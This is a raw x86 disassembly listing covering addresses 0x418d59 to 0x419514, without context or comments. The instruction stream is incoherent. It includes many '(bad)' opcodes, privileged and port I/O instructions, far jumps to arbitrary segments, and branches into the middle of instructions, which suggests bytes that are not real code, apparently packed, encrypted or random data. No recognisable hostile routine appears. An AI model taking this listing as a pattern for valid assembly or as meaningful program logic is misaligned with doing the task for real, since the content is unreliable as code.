  418d59:	sub    eax,0x2c711ae3
  418d5e:	or     ebx,DWORD PTR [esi+0x5a07d2ad]
  418d64:	test   al,0xab
  418d66:	add    al,BYTE PTR [ebp-0x29]
  418d69:	call   0xe4a3:0x8e367be0
  418d70:	and    DWORD PTR [esi-0x421f3442],ecx
  418d76:	iret   
  418d77:	mov    DWORD PTR [edx],edi
  418d79:	cmp    ecx,DWORD PTR [esi+ecx*8]
  418d7c:	add    eax,0x16e37cd6
  418d81:	inc    esi
  418d82:	sub    al,BYTE PTR [esi-0x26]
  418d85:	(bad)  
  418d86:	stos   DWORD PTR es:[edi],eax
  418d87:	test   BYTE PTR [eax+0x71],cl
  418d8a:	pop    ecx
  418d8b:	icebp  
  418d8c:	sub    al,0x61
  418d8e:	mov    ch,0xe2
  418d90:	sbb    ecx,esi
  418d92:	jo     0x418d2e
  418d94:	jb     0x418dcf
  418d96:	jo     0x418d6d
  418d98:	fst    DWORD PTR [edi-0x3f]
  418d9b:	fisub  DWORD PTR [ebx+0x6]
  418d9e:	add    DWORD PTR [edx+0x9ceee10],esi
  418da4:	inc    ebp
  418da5:	fs or  al,0xf3
  418da8:	or     BYTE PTR [ebx+0x69],0xf8
  418dac:	inc    edx
  418dad:	jbe    0x418d8d
  418daf:	xchg   BYTE PTR [edi-0x6b],bh
  418db2:	loop   0x418e02
  418db4:	nop
  418db5:	jmp    0x418e04
  418db7:	jge    0x418d63
  418db9:	lahf   
  418dba:	into   
  418dbb:	mov    ah,0xe4
  418dbd:	xchg   ebx,eax
  418dbe:	loop   0x418dc7
  418dc0:	iret   
  418dc1:	pop    ss
  418dc2:	push   ds
  418dc3:	bnd jne 0x418db2
  418dc6:	xor    bl,BYTE PTR es:[edi+0x5e]
  418dca:	test   al,0x88
  418dcc:	lods   al,BYTE PTR ds:[esi]
  418dcd:	(bad)  
  418dce:	pop    ecx
  418dcf:	fadd   DWORD PTR [ecx]
  418dd1:	daa    
  418dd2:	mov    ebx,0xbba80345
  418dd7:	adc    edi,ebp
  418dd9:	(bad)  
  418dda:	popf   
  418ddb:	cwde   
  418ddc:	add    eax,DWORD PTR [ecx+0x39d3ff37]
  418de2:	lock pop edi
  418de4:	sbb    edx,DWORD PTR [edi+eax*8+0x6ff429f9]
  418deb:	push   eax
  418dec:	add    DWORD PTR [ebx],0x38140a32
  418df2:	sbb    eax,0x6563ee22
  418df7:	add    ah,al
  418df9:	(bad)  
  418dfa:	loope  0x418e4a
  418dfc:	into   
  418dfd:	lods   eax,DWORD PTR ds:[esi]
  418dfe:	inc    esi
  418dff:	(bad)  
  418e00:	cli    
  418e01:	mov    DWORD PTR [ebx],esp
  418e03:	xchg   DWORD PTR [edi-0x6b33d3ca],ebp
  418e09:	data16 jp 0x418e5c
  418e0c:	nop
  418e0d:	and    eax,0xf0d33fd8
  418e12:	fs jne 0x418e8c
  418e15:	inc    ebx
  418e16:	lds    ebp,FWORD PTR [eax]
  418e18:	push   eax
  418e19:	rol    BYTE PTR [ecx],1
  418e1b:	sbb    ebx,DWORD PTR [edx]
  418e1d:	aam    0x3f
  418e1f:	inc    eax
  418e20:	jo     0x418e77
  418e22:	fisubr WORD PTR [edx+esi*2-0x79]
  418e26:	mov    eax,ds:0x6fc3305a
  418e2b:	cmp    cl,BYTE PTR [edx+0x3cd171fd]
  418e31:	jo     0x418e58
  418e33:	add    DWORD PTR ds:0x95fff70a,esi
  418e39:	or     esi,DWORD PTR [esi]
  418e3b:	in     al,0x92
  418e3d:	dec    esp
  418e3e:	int    0xc8
  418e40:	movd   DWORD PTR [esi],mm0
  418e43:	cdq    
  418e44:	or     esp,DWORD PTR [ebp-0x641d98ad]
  418e4a:	loopne 0x418def
  418e4c:	sti    
  418e4d:	in     eax,dx
  418e4e:	xchg   esp,eax
  418e4f:	add    ecx,DWORD PTR [ebx+0x51]
  418e52:	adc    DWORD PTR [ebp+0x50892d3f],0x64a57bc1
  418e5c:	and    al,0xfc
  418e5e:	mov    ebp,0xd476340b
  418e63:	(bad)  [ebp+0x40b2707e]
  418e69:	sub    ecx,DWORD PTR [ebx+ecx*1+0x1e]
  418e6d:	jg     0x418ed4
  418e6f:	fmul   QWORD PTR [edi]
  418e71:	xchg   edx,eax
  418e72:	xlat   BYTE PTR ds:[ebx]
  418e73:	jns    0x418e8a
  418e75:	sub    DWORD PTR ds:0x239cd40a,0xfbe0243e
  418e7f:	ret    0x9d9
  418e82:	test   al,0xfc
  418e84:	clc    
  418e85:	mov    dl,0xc6
  418e87:	sub    dl,ch
  418e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e8a:	scas   eax,DWORD PTR es:[edi]
  418e8b:	jecxz  0x418ed3
  418e8d:	fs enter 0x3b95,0x33
  418e92:	cwde   
  418e93:	mov    ebx,0x248d36c8
  418e98:	or     BYTE PTR [eiz*8+0x623c2732],bl
  418e9f:	clc    
  418ea0:	pop    ecx
  418ea1:	jne    0x418eb0
  418ea3:	out    dx,al
  418ea4:	mov    esi,0x1d553d8a
  418ea9:	aas    
  418eaa:	push   ds
  418eab:	in     al,dx
  418eac:	pushf  
  418ead:	mov    ds,WORD PTR [edx]
  418eaf:	(bad)  
  418eb0:	xchg   esp,eax
  418eb1:	xor    eax,0x2f4d1c0
  418eb6:	xchg   edi,eax
  418eb7:	inc    eax
  418eb8:	xor    ebp,DWORD PTR [edi+0x3e]
  418ebb:	jns    0x418f20
  418ebd:	mov    ch,0xb2
  418ebf:	add    ebx,DWORD PTR [edx+0x7]
  418ec2:	push   cs
  418ec3:	push   ebx
  418ec4:	ret    0xd5af
  418ec7:	fdivr  DWORD PTR [ebx+0x4e592c72]
  418ecd:	loop   0x418e7c
  418ecf:	daa    
  418ed0:	xchg   DWORD PTR [edi-0x5049b267],ebp
  418ed6:	mov    edx,0x9600c264
  418edb:	inc    ebx
  418edc:	nop
  418edd:	mov    ecx,0x571008df
  418ee2:	mov    ch,0x87
  418ee4:	and    eax,ebp
  418ee6:	cmp    ch,BYTE PTR [ebx]
  418ee8:	cmp    bl,cl
  418eea:	xor    edx,eax
  418eec:	cmp    al,0xbd
  418eee:	je     0x418f3c
  418ef0:	cmp    al,0x5f
  418ef2:	push   esi
  418ef3:	call   0xe73e9d0c
  418ef8:	sub    esi,DWORD PTR [ecx+0x28f5b234]
  418efe:	mov    ch,0xb1
  418f00:	pop    ecx
  418f01:	ja     0x418eff
  418f03:	retf   0x5f48
  418f06:	shl    BYTE PTR [ebx],cl
  418f08:	inc    eax
  418f09:	or     ah,cl
  418f0b:	(bad)  
  418f0c:	sub    DWORD PTR [edx-0x54f82d84],edx
  418f12:	add    eax,0x193a9306
  418f17:	pop    edx
  418f18:	out    0xeb,al
  418f1a:	mov    al,0x69
  418f1c:	fist   WORD PTR [esi-0x197354f0]
  418f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f23:	aam    0x99
  418f25:	push   ebp
  418f26:	push   ds
  418f27:	inc    edx
  418f28:	mov    dh,0x52
  418f2a:	sbb    DWORD PTR [ecx-0x30cf67f4],esp
  418f30:	jg     0x418efd
  418f32:	mov    dl,0xa5
  418f34:	dec    ecx
  418f35:	push   ecx
  418f36:	daa    
  418f37:	jp     0x418f99
  418f39:	out    dx,al
  418f3a:	mov    dh,BYTE PTR [ebp-0x59]
  418f3d:	enter  0xe6f5,0x22
  418f41:	mov    WORD PTR [ebp+0x2e],es
  418f44:	cli    
  418f45:	into   
  418f46:	mov    edi,0xab22ba87
  418f4b:	popf   
  418f4c:	(bad)  
  418f4d:	setbe  BYTE PTR [ebx-0x613650f0]
  418f54:	xlat   BYTE PTR ds:[ebx]
  418f55:	jecxz  0x418f7c
  418f57:	pop    ecx
  418f58:	mov    esp,0x2be2f829
  418f5d:	lods   eax,DWORD PTR ds:[esi]
  418f5e:	into   
  418f5f:	dec    edi
  418f60:	aas    
  418f61:	xchg   ebp,eax
  418f62:	out    0x4b,al
  418f64:	inc    edi
  418f65:	cmp    al,0x48
  418f67:	out    dx,eax
  418f68:	stc    
  418f69:	sbb    al,0xc2
  418f6b:	xor    ecx,DWORD PTR [edi+ebx*8+0x47]
  418f6f:	or     esi,eax
  418f71:	ror    ebx,cl
  418f73:	add    ebp,esi
  418f75:	call   0x94e9:0xf12a87fb
  418f7c:	aam    0x54
  418f7e:	sub    dl,BYTE PTR [edi]
  418f80:	jbe    0x418f9d
  418f82:	leave  
  418f83:	std    
  418f84:	(bad)  
  418f85:	(bad)  
  418f86:	sub    BYTE PTR [ebx-0x61],cl
  418f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f8a:	pop    es
  418f8b:	and    eax,0x2c7f8353
  418f90:	add    al,0x50
  418f92:	std    
  418f93:	xlat   BYTE PTR ds:[ebx]
  418f94:	mov    dl,0x57
  418f96:	cmp    eax,0x4242f05a
  418f9b:	xchg   ebx,eax
  418f9c:	dec    edi
  418f9d:	xor    DWORD PTR [ecx+0x5bfea6f7],0x31
  418fa4:	cmp    ah,BYTE PTR [edi+0x526725d6]
  418faa:	out    dx,eax
  418fab:	xor    bl,ch
  418fad:	stos   BYTE PTR es:[edi],al
  418fae:	aad    0x51
  418fb0:	das    
  418fb1:	mov    ecx,0x102c6105
  418fb6:	mov    DWORD PTR [ebp+ebp*2+0x6f6ce70b],ebp
  418fbd:	adc    ah,BYTE PTR [esp+eiz*4+0x1d]
  418fc1:	stc    
  418fc2:	or     ch,BYTE PTR [eax-0x4b]
  418fc5:	inc    esi
  418fc6:	push   ds
  418fc7:	pushf  
  418fc8:	mov    ds:0xc5b94c79,al
  418fcd:	xor    al,cl
  418fcf:	push   0xffffffa3
  418fd1:	lods   al,BYTE PTR ds:[esi]
  418fd2:	mov    cl,0x29
  418fd4:	imul   ecx,eax,0xee00155f
  418fda:	inc    ebx
  418fdb:	or     bl,BYTE PTR [esi]
  418fdd:	call   0x3ce3ee93
  418fe2:	fcom   QWORD PTR [eax+0x46b6eba9]
  418fe8:	loopne 0x419013
  418fea:	test   DWORD PTR [esi],ecx
  418fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fed:	xor    al,0x70
  418fef:	dec    edx
  418ff0:	jno    0x41905e
  418ff2:	jnp    0x41904d
  418ff4:	xchg   esi,eax
  418ff5:	inc    esp
  418ff6:	cwde   
  418ff7:	jns    0x418f94
  418ff9:	inc    edx
  418ffa:	shl    al,0xb7
  418ffd:	sub    DWORD PTR [ecx-0x7c],ebp
  419000:	pusha  
  419001:	mov    bh,0xbc
  419003:	or     eax,0x81fe6e2a
  419008:	mov    edi,DWORD PTR [esi+0x398fb2e5]
  41900e:	les    ecx,FWORD PTR [ebx+0x64]
  419011:	aad    0xf
  419013:	jns    0x41907b
  419015:	mov    cl,0xd8
  419017:	cmp    edi,0x2fd40b70
  41901d:	mov    ebp,0x4e4048ea
  419022:	xchg   ecx,eax
  419023:	(bad)  [eax+0x6c]
  419026:	cmc    
  419027:	dec    esp
  419028:	xchg   esi,eax
  419029:	mov    ch,0xba
  41902b:	jae    0x419002
  41902d:	xchg   esi,eax
  41902e:	not    BYTE PTR [ebp+0x74]
  419031:	add    dl,bl
  419033:	pop    es
  419034:	dec    ebp
  419035:	add    al,BYTE PTR [edx-0x1b]
  419038:	push   es
  419039:	lea    ebp,[ebx+0x53c0a597]
  41903f:	dec    eax
  419040:	dec    edi
  419041:	lds    esi,FWORD PTR [esp+ecx*8]
  419044:	popa   
  419045:	mov    bh,0x51
  419047:	(bad)  
  419048:	retf   0x1bf5
  41904b:	mov    dl,0xd
  41904d:	repnz or ebx,DWORD PTR [ebx]
  419050:	add    al,al
  419052:	ins    DWORD PTR es:[edi],dx
  419053:	xchg   ebx,eax
  419054:	or     cl,dl
  419056:	add    BYTE PTR [edx+0x72],0xba
  41905a:	xchg   ebx,eax
  41905b:	xchg   edi,eax
  41905c:	mov    BYTE PTR [edx],bh
  41905e:	or     BYTE PTR [ebx+0x31],cl
  419061:	add    DWORD PTR [esp+ebp*4+0x3205728c],ebx
  419068:	retf   0xc91
  41906b:	sub    eax,0xdaedb09a
  419070:	les    ebp,FWORD PTR [edx+0x5]
  419073:	mov    esp,0x623135bd
  419078:	push   ebx
  419079:	mov    ch,0x37
  41907b:	cwde   
  41907c:	rol    esp,cl
  41907e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419080:	jecxz  0x4190f9
  419082:	pop    ds
  419083:	outs   dx,BYTE PTR ds:[esi]
  419084:	ret    
  419085:	dec    ebx
  419086:	(bad)  
  419087:	pusha  
  419088:	pusha  
  419089:	push   eax
  41908a:	mov    esp,0xc1d6bf28
  41908f:	cwde   
  419090:	shr    BYTE PTR [edi],1
  419092:	xlat   BYTE PTR ds:[ebx]
  419093:	les    ecx,FWORD PTR [ecx+ebx*4]
  419096:	ss sahf 
  419098:	and    ecx,DWORD PTR [esi+edx*2+0x20]
  41909c:	mov    cl,0x51
  41909e:	pxor   mm4,QWORD PTR [edx+ecx*4-0x77e4f60f]
  4190a6:	jb     0x419050
  4190a8:	out    0xcd,eax
  4190aa:	xor    edi,esp
  4190ac:	std    
  4190ad:	ror    BYTE PTR [ecx+0x7c],1
  4190b0:	xchg   esi,eax
  4190b1:	mov    ah,BYTE PTR ds:0x7d492c7e
  4190b7:	int3   
  4190b8:	fcomp  QWORD PTR [eax-0x2963ad56]
  4190be:	xor    edi,ebx
  4190c0:	popa   
  4190c1:	lods   eax,DWORD PTR ds:[esi]
  4190c2:	mov    dh,0x79
  4190c4:	rol    DWORD PTR ds:0xf6b9e243,0x7a
  4190cb:	dec    ebp
  4190cc:	or     esi,eax
  4190ce:	cmp    BYTE PTR [ecx],cl
  4190d0:	and    DWORD PTR [eax+0x4cce94bc],esi
  4190d6:	add    DWORD PTR [ecx],edi
  4190d8:	jmp    0x45ec:0x797dfdf
  4190df:	aad    0xaa
  4190e1:	mov    cl,0x88
  4190e3:	aaa    
  4190e4:	adc    eax,edx
  4190e6:	lahf   
  4190e7:	lock (bad) 
  4190e9:	fld    TBYTE PTR [esi]
  4190eb:	mov    BYTE PTR [edx+ebx*2+0x5f],dl
  4190ef:	std    
  4190f0:	ss stos DWORD PTR es:[edi],eax
  4190f2:	fs test eax,0x36343c7f
  4190f8:	or     BYTE PTR [edx+0x1fac5b8d],dl
  4190fe:	xchg   edx,eax
  4190ff:	leave  
  419100:	push   ebx
  419101:	js     0x4190e1
  419103:	dec    edi
  419104:	mov    eax,ds:0x48de88da
  419109:	cs fwait
  41910b:	push   cs
  41910c:	mov    ch,0xfe
  41910e:	xor    al,0x2c
  419110:	xor    al,0x87
  419112:	push   cs
  419113:	or     eax,0xdb311413
  419118:	mov    cl,0x3b
  41911a:	inc    edi
  41911b:	jle    0x4190d2
  41911d:	in     al,dx
  41911e:	pop    ebp
  41911f:	mov    al,0xd1
  419121:	int3   
  419122:	aaa    
  419123:	aaa    
  419124:	aam    0x5b
  419126:	in     al,dx
  419127:	xchg   edx,eax
  419128:	pop    edx
  419129:	sbb    al,BYTE PTR fs:[edi]
  41912c:	std    
  41912d:	pusha  
  41912e:	shr    BYTE PTR [edi-0x54],0x3
  419132:	pusha  
  419133:	jp     0x419147
  419135:	push   es
  419136:	hlt    
  419137:	cld    
  419138:	test   al,0x6b
  41913a:	xor    al,0xd0
  41913c:	mov    ah,0xfe
  41913e:	push   ds
  41913f:	mov    edx,0xea153194
  419144:	iret   
  419145:	jne    0x419118
  419147:	shr    DWORD PTR [ebx+0x3f],0xbb
  41914b:	mov    edi,0x7f7ffd2e
  419150:	ficomp DWORD PTR [ecx]
  419152:	cmp    eax,0x1788265
  419157:	je     0x4190f2
  419159:	addr16 out 0xb4,al
  41915c:	std    
  41915d:	push   edi
  41915e:	imul   esp,DWORD PTR [edi+eiz*4],0xb4a723a9
  419165:	call   0xa9fc:0x55188395
  41916c:	jmp    0x41914f
  41916e:	jmp    0x8f86:0xa1a516ac
  419175:	inc    ebp
  419176:	repz leave 
  419178:	ret    
  419179:	data16 (bad) 
  41917b:	mov    ah,BYTE PTR [ebx-0x57176349]
  419181:	cmp    eax,0x53e32bcd
  419186:	add    bl,dl
  419188:	lods   eax,DWORD PTR ds:[esi]
  419189:	cmp    eax,0xfd6e3a32
  41918e:	ins    DWORD PTR es:[edi],dx
  41918f:	lock aam 0x5b
  419192:	loope  0x419123
  419194:	ds clc 
  419196:	jnp    0x419206
  419198:	repnz pop ecx
  41919a:	test   BYTE PTR [edx+0x6e],cl
  41919d:	aaa    
  41919e:	addr16 std 
  4191a0:	add    ebp,DWORD PTR [eax]
  4191a2:	xchg   esi,eax
  4191a3:	xor    eax,DWORD PTR [bp-0x20]
  4191a7:	fcom   DWORD PTR [ecx-0x444e9a7f]
  4191ad:	icebp  
  4191ae:	adc    bh,BYTE PTR [esi+0x1bad32b9]
  4191b4:	mov    eax,0x2c3ba4e
  4191b9:	pop    ds
  4191ba:	scas   eax,DWORD PTR es:[edi]
  4191bb:	sub    BYTE PTR [eax],ch
  4191bd:	daa    
  4191be:	les    ebp,FWORD PTR [esi+ebx*4+0xd484861]
  4191c5:	pop    es
  4191c6:	sub    eax,0xe977b747
  4191cb:	mov    eax,0x67b54cdf
  4191d0:	and    DWORD PTR [ebp+0x3a962876],0xfffffff6
  4191d7:	dec    eax
  4191d8:	pop    eax
  4191d9:	mov    ebp,0xd2b5ad56
  4191de:	mov    dl,0xf5
  4191e0:	sub    DWORD PTR [ebp+eax*4-0x65],esi
  4191e4:	loop   0x419211
  4191e6:	mov    ebp,0x420a1189
  4191eb:	sti    
  4191ec:	call   0x18ee6aec
  4191f1:	(bad)  
  4191f2:	popf   
  4191f3:	shr    BYTE PTR gs:[edi+0x5],1
  4191f7:	sbb    BYTE PTR [ecx-0x37bc992b],bh
  4191fd:	mov    bl,0x2
  4191ff:	es sub eax,0xb192c6e4
  419205:	dec    esp
  419206:	pop    ebp
  419207:	sub    eax,0x6ab253ea
  41920c:	sahf   
  41920d:	xchg   edi,eax
  41920e:	mov    bh,0x25
  419210:	fisttp QWORD PTR [ebx+0x48]
  419213:	sub    ah,bh
  419215:	dec    edi
  419216:	or     bh,BYTE PTR [ebx]
  419218:	xor    BYTE PTR [esi],al
  41921a:	add    BYTE PTR [edx+0x73b2a315],bl
  419220:	lods   al,BYTE PTR ds:[esi]
  419221:	nop
  419222:	inc    ebx
  419223:	stos   BYTE PTR es:[edi],al
  419224:	out    dx,al
  419225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419226:	cmp    DWORD PTR [ebx-0x26],esp
  419229:	rol    BYTE PTR [ebx+0x36],0x1b
  41922d:	mov    al,ds:0xdc07da9
  419232:	mov    dh,0xf8
  419234:	inc    esi
  419235:	sbb    DWORD PTR [edx-0x2b],ecx
  419238:	icebp  
  419239:	adc    BYTE PTR [eax],bh
  41923b:	aam    0x66
  41923d:	sbb    ebx,DWORD PTR [edx-0x52118b25]
  419243:	aam    0x5a
  419245:	add    al,BYTE PTR [eax]
  419247:	fldcw  WORD PTR [esi]
  419249:	cli    
  41924a:	pop    eax
  41924b:	mov    esi,0x109ed5e0
  419250:	daa    
  419251:	push   esp
  419252:	mov    bh,0xb5
  419254:	shl    dh,cl
  419256:	push   ebp
  419257:	mov    al,0xe3
  419259:	pop    ecx
  41925a:	and    dh,BYTE PTR [edi+edx*1+0x1b4e8f8e]
  419261:	repz sub al,0xf5
  419264:	mov    dl,0x19
  419266:	push   edx
  419267:	inc    eax
  419268:	inc    eax
  419269:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41926a:	mov    al,ds:0x21839055
  41926f:	sub    al,0xb8
  419271:	sti    
  419272:	xor    eax,0x7dbdb75e
  419277:	ds mov cs,WORD PTR ds:[ebx+0x10]
  41927c:	and    ebp,ebp
  41927e:	fiadd  DWORD PTR [ecx]
  419280:	inc    esi
  419281:	test   BYTE PTR [ebp-0xb],dl
  419284:	mov    ah,0x11
  419286:	jecxz  0x41929d
  419288:	in     al,0xcd
  41928a:	add    bh,BYTE PTR [ecx+0x2e]
  41928d:	xor    al,0x90
  41928f:	mov    bh,0x8f
  419291:	std    
  419292:	rcl    ah,0x34
  419295:	ins    DWORD PTR es:[edi],dx
  419296:	popa   
  419297:	shl    BYTE PTR [ebp+0x6237d98],0xcb
  41929e:	cs inc ebp
  4192a0:	or     eax,0xff80797e
  4192a5:	dec    ebx
  4192a6:	xchg   ecx,eax
  4192a7:	xlat   BYTE PTR ds:[ebx]
  4192a8:	(bad)  
  4192aa:	enter  0x5f74,0x89
  4192ae:	repz pop edx
  4192b0:	mov    ebp,0xc4fdf2c4
  4192b5:	lahf   
  4192b6:	cmp    eax,0xe552b850
  4192bb:	repz xchg edx,esi
  4192be:	mov    cr0,edx
  4192c1:	int3   
  4192c2:	sar    BYTE PTR [ebx],0x38
  4192c5:	dec    ebp
  4192c6:	dec    esi
  4192c7:	cmp    edx,DWORD PTR [esi-0x5af5413d]
  4192cd:	push   esi
  4192ce:	lods   eax,DWORD PTR ds:[esi]
  4192cf:	(bad)  
  4192d0:	ins    BYTE PTR es:[edi],dx
  4192d1:	jg     0x4192db
  4192d3:	iret   
  4192d4:	push   edx
  4192d5:	addr16 out dx,eax
  4192d7:	sub    BYTE PTR [esi+0x73],bh
  4192da:	mov    edi,0x1343f755
  4192df:	pop    edi
  4192e0:	cmp    DWORD PTR [eax-0x67],ebx
  4192e3:	mov    edi,0x7729d223
  4192e8:	sbb    DWORD PTR [esi+0x16de8952],eax
  4192ee:	push   esi
  4192ef:	sub    al,0xee
  4192f1:	inc    esp
  4192f2:	add    DWORD PTR [esi],0x26e35f41
  4192f8:	daa    
  4192f9:	and    al,dl
  4192fb:	dec    edi
  4192fc:	sub    al,0xa5
  4192fe:	mov    edi,0xcfda9a1c
  419303:	int    0xe9
  419305:	fxch   st(2)
  419307:	push   es
  419308:	xchg   ebx,eax
  419309:	test   al,0x22
  41930b:	test   DWORD PTR [ebp-0xb3aeee],ebp
  419311:	bound  ebp,QWORD PTR [eax]
  419313:	mov    edi,0x9efebd92
  419318:	into   
  419319:	stos   DWORD PTR es:[edi],eax
  41931a:	hlt    
  41931b:	dec    sp
  41931d:	out    0x6e,al
  41931f:	ds xchg edx,eax
  419321:	out    0x77,al
  419323:	cdq    
  419324:	dec    ebx
  419325:	(bad)  
  419326:	sub    al,0xff
  419328:	push   ebp
  419329:	push   ecx
  41932a:	(bad)  
  41932b:	sub    BYTE PTR [ebx],cl
  41932d:	push   ecx
  41932e:	jmp    0xea0:0x869619f1
  419335:	int3   
  419336:	sub    edi,DWORD PTR [edx+0x1e]
  419339:	mov    edi,0x29578e13
  41933e:	(bad)  
  41933f:	out    dx,al
  419340:	ss inc esi
  419342:	repz rol ecx,cl
  419345:	push   ss
  419346:	adc    DWORD PTR [edx],eax
  419348:	dec    edx
  419349:	aad    0xba
  41934b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41934c:	outs   dx,BYTE PTR ds:[esi]
  41934d:	cs int 0xe6
  419350:	jecxz  0x4192da
  419352:	fwait
  419353:	dec    ebx
  419354:	je     0x41939f
  419356:	inc    edi
  419357:	xchg   ebp,eax
  419358:	lock es scas eax,DWORD PTR es:[edi]
  41935b:	cs cli 
  41935d:	push   eax
  41935e:	cmp    eax,0x511a0bb3
  419363:	add    eax,0xa4c906b3
  419368:	faddp  st(1),st
  41936a:	(bad)  
  41936b:	stos   BYTE PTR es:[edi],al
  41936c:	cs pop ebp
  41936e:	sahf   
  41936f:	lea    esp,[ebx+0x6a07ed69]
  419375:	mov    ds:0x84174480,al
  41937a:	(bad)  
  41937b:	fisub  DWORD PTR ds:0x739f2924
  419381:	mov    ebx,0xfd624f1a
  419386:	push   0x4280c8b4
  41938b:	rcr    ebx,0x25
  41938e:	xchg   ebx,eax
  419390:	xor    eax,0xdbb00ecc
  419395:	jb     0x4193e6
  419397:	hlt    
  419398:	inc    esp
  419399:	iret   
  41939a:	dec    edx
  41939b:	jae    0x4193d3
  41939d:	mov    eax,ds:0x68465f7e
  4193a2:	aas    
  4193a3:	jnp    0x419339
  4193a5:	call   0x8baa2b46
  4193aa:	pushf  
  4193ab:	ror    DWORD PTR [ecx],1
  4193ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193ae:	add    ecx,DWORD PTR [esi+0x5a]
  4193b1:	jae    0x4193b3
  4193b3:	add    DWORD PTR [ebx-0x56a73ab2],0xa1945684
  4193bd:	mov    eax,ds:0x45af8fb2
  4193c2:	mov    bl,ah
  4193c4:	push   ebx
  4193c5:	ins    DWORD PTR es:[edi],dx
  4193c6:	fmul   st,st(1)
  4193c8:	mov    ebx,0xe385e164
  4193cd:	cmp    bl,BYTE PTR [esi-0x286f62ce]
  4193d3:	retf   
  4193d4:	js     0x4193ac
  4193d6:	std    
  4193d7:	xchg   esp,eax
  4193d8:	mov    fs,WORD PTR [ebx+0xe90573c]
  4193de:	pop    edx
  4193df:	mov    esi,esp
  4193e1:	in     al,0x7b
  4193e3:	sbb    ecx,DWORD PTR [eax-0x13]
  4193e6:	sbb    edi,DWORD PTR [ebx-0x46]
  4193e9:	sub    edi,0xffffff92
  4193ec:	in     eax,dx
  4193ed:	cmp    ebp,esp
  4193ef:	mov    ebp,0xf676653e
  4193f4:	xchg   ebx,eax
  4193f5:	shr    bl,0xb
  4193f8:	and    esp,0xbbf3a548
  4193fe:	dec    edx
  4193ff:	pop    edx
  419400:	dec    edx
  419401:	sub    BYTE PTR [eax],ch
  419403:	fsubr  DWORD PTR [ecx]
  419405:	inc    edi
  419406:	icebp  
  419407:	jmp    0x41946a
  419409:	clc    
  41940a:	lods   al,BYTE PTR ds:[esi]
  41940b:	(bad)  
  41940c:	(bad)  
  41940d:	sub    eax,0x8e725694
  419412:	scas   al,BYTE PTR es:[edi]
  419413:	fwait
  419414:	or     ah,BYTE PTR [edx-0x41323e55]
  41941a:	xor    ebx,DWORD PTR [esi-0x482d11ee]
  419420:	lock inc DWORD PTR [edx]
  419423:	outs   dx,BYTE PTR ds:[esi]
  419424:	lods   eax,DWORD PTR ds:[esi]
  419425:	fs push ds
  419427:	sahf   
  419428:	sbb    DWORD PTR [edx],0xc19fc948
  41942e:	push   0xffffffed
  419430:	mov    ebx,0xbb8eacd0
  419435:	rcr    cl,cl
  419437:	test   al,0x10
  419439:	pushf  
  41943a:	(bad)  
  41943b:	aam    0x18
  41943d:	push   es
  41943e:	imul   BYTE PTR [esi+0x1284bfe3]
  419444:	test   BYTE PTR [eax-0x9],ch
  419447:	and    bl,BYTE PTR [ebp+0x54]
  41944a:	xchg   BYTE PTR [eax+0x1d],ah
  41944d:	xor    DWORD PTR [ecx-0x1e],0xc89aaa60
  419454:	add    ch,BYTE PTR [ebp-0x30efcf3e]
  41945a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41945b:	(bad)  
  41945c:	push   esp
  41945d:	mov    ebp,0x44363037
  419462:	cmp    DWORD PTR [ecx-0x50],edx
  419465:	pop    ecx
  419466:	xor    BYTE PTR [edx+0x3bde8138],bl
  41946c:	push   cs
  41946d:	xor    esi,eax
  41946f:	mov    ah,0x90
  419471:	sub    BYTE PTR [ecx],al
  419473:	out    0x57,eax
  419475:	jmp    0xd80b:0xaa1863bb
  41947c:	adc    ah,BYTE PTR [eax]
  41947e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41947f:	rcr    BYTE PTR [eax-0xd5effd4],cl
  419485:	add    BYTE PTR [esi],0x8a
  419488:	mov    es,WORD PTR [esi-0x7a]
  41948b:	nop
  41948c:	nop
  41948d:	push   ecx
  41948e:	or     dl,BYTE PTR [ecx-0x7b598f71]
  419494:	pop    ebx
  419495:	xor    ch,dh
  419497:	mov    esi,0x12f0c298
  41949c:	and    ebx,DWORD PTR [ecx+ebp*4-0x3]
  4194a0:	inc    ebp
  4194a1:	jnp    0x419457
  4194a3:	cli    
  4194a4:	nop
  4194a5:	xchg   BYTE PTR [ecx+0x12],bl
  4194a8:	and    bh,BYTE PTR [edi-0x506aac99]
  4194ae:	int    0xa6
  4194b0:	sub    bh,BYTE PTR gs:[eax]
  4194b3:	dec    edx
  4194b4:	jp     0x4194eb
  4194b6:	add    eax,0x40b4cc30
  4194bb:	mov    DWORD PTR [esi+0x5c],ecx
  4194be:	js     0x4194c9
  4194c0:	(bad)  
  4194c1:	fbld   TBYTE PTR [edx]
  4194c3:	mov    eax,ds:0x1c854ddf
  4194c8:	sub    eax,0x32100de7
  4194cd:	jnp    0x419497
  4194cf:	in     eax,dx
  4194d0:	dec    edi
  4194d1:	pop    edx
  4194d2:	pop    es
  4194d3:	mov    cl,0xdd
  4194d5:	mov    al,ds:0xac15f2ba
  4194da:	jecxz  0x4194c5
  4194dc:	add    BYTE PTR [esi],dh
  4194de:	sbb    eax,DWORD PTR [esi]
  4194e0:	in     al,dx
  4194e1:	xor    al,0xa9
  4194e3:	or     esi,DWORD PTR [edx-0x57660cc9]
  4194e9:	push   0x1bd090c5
  4194ee:	in     al,0xfb
  4194f0:	aaa    
  4194f1:	clc    
  4194f2:	out    0x16,al
  4194f4:	test   DWORD PTR [ebx-0x43c9dbe3],eax
  4194fa:	int3   
  4194fb:	sub    DWORD PTR [edi+edx*4+0x40e9d7d4],ebx
  419502:	jnp    0x41955d
  419504:	clc    
  419505:	outs   dx,BYTE PTR fs:[esi]
  419507:	mov    cl,0xcf
  419509:	xchg   esp,eax
  41950a:	jmp    DWORD PTR [ebx]
  41950c:	outs   dx,BYTE PTR ds:[esi]
  41950d:	push   edx
  41950e:	in     al,dx
  41950f:	xchg   BYTE PTR [edx],cl
  419511:	add    ebx,DWORD PTR [ecx]
  419513:	hlt    
  419514:	outs   dx,BYTE PTR ds:[esi]
